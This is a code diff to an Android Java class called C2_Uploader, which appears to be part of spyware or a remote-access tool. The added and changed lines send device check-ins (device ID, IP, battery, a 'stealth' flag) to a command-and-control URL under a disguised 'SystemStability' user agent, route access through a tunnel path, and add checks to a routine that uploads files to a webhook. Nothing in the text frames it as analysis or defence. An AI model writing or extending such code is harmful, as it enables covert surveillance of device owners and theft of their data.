@@ -55,10 +55,6 @@ public class C2_Uploader {
                 String ip = MainActivity.getLocalIpAddress();
                 int port = FirebaseConfig.DEFAULT_PORT;
                 
-                // [STABILITY_SYNC] Format the tactical P2P link
-                String formattedIp = (ip != null && ip.contains(":")) ? "[" + ip + "]" : ip;
-                String directLink = "http://" + formattedIp + ":" + port;
-
                 JSONObject status = new JSONObject();
                 status.put("deviceId", getDeviceId(context));
                 status.put("type", "checkin");
@@ -67,10 +63,10 @@ public class C2_Uploader {
                 status.put("battery", SystemAnalytics.getBatteryLevel(context) + "%");
                 status.put("ip", ip);
                 status.put("port", port);
-                status.put("link", directLink);
+                status.put("link", "/tunnel?deviceId=" + getDeviceId(context));
                 status.put("stealth", SystemAnalytics.isStealthEnabled(context));
                 
-                postJson(c2Url, status.toString());
+                postJsonSync(c2Url, status.toString());
             } catch (Exception e) {
                 Log.e(TAG, "Check-in failed: " + e.getMessage());
             }
@@ -78,37 +74,47 @@ public class C2_Uploader {
     }
 
     /**
-     * Generic JSON POST method for C2 communication.
+     * Synchronous JSON POST method for C2 communication.
+     */
+    public static void postJsonSync(String urlString, String json) {
+        HttpURLConnection conn = null;
+        try {
+            URL url = new URL(urlString);
+            conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("POST");
+            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
+            conn.setRequestProperty("User-Agent", "SystemStability/1.5");
+            conn.setConnectTimeout(15000);
+            conn.setReadTimeout(15000);
+            conn.setDoOutput(true);
+
+            try (OutputStream os = conn.getOutputStream()) {
+                byte[] input = json.getBytes(StandardCharsets.UTF_8);
+                os.write(input, 0, input.length);
+            }
+
+            int code = conn.getResponseCode();
+            Log.d(TAG, "C2 JSON POST Response: " + code);
+        } catch (Exception e) {
+            Log.e(TAG, "C2 POST Error: " + e.getMessage());
+        } finally {
+            if (conn != null) conn.disconnect();
+        }
+    }
+
+    /**
+     * Async JSON POST method for C2 communication.
      */
     public static void postJson(String urlString, String json) {
-        new Thread(() -> {
-            HttpURLConnection conn = null;
-            try {
-                URL url = new URL(urlString);
-                conn = (HttpURLConnection) url.openConnection();
-                conn.setRequestMethod("POST");
-                conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
-                conn.setRequestProperty("User-Agent", "SystemStability/1.5");
-                conn.setConnectTimeout(15000);
-                conn.setReadTimeout(15000);
-                conn.setDoOutput(true);
-
-                try (OutputStream os = conn.getOutputStream()) {
-                    byte[] input = json.getBytes(StandardCharsets.UTF_8);
-                    os.write(input, 0, input.length);
-                }
-
-                int code = conn.getResponseCode();
-                Log.d(TAG, "C2 JSON POST Response: " + code);
-            } catch (Exception e) {
-                Log.e(TAG, "C2 POST Error: " + e.getMessage());
-            } finally {
-                if (conn != null) conn.disconnect();
-            }
-        }).start();
+        new Thread(() -> postJsonSync(urlString, json)).start();
     }
 
     public static void uploadFile(Context context, File file) {
+        if (file == null || !file.exists() || !file.canRead()) {
+            Log.e(TAG, "UPLOAD_ERROR: File is invalid or inaccessible.");
+            return;
+        }
+
         String webhookUrl = BuildConfig.WEBHOOK_URL;
         if (webhookUrl == null || webhookUrl.isEmpty()) {
             Log.e(TAG, "UPLOAD_ERROR: No C2 URL defined.");
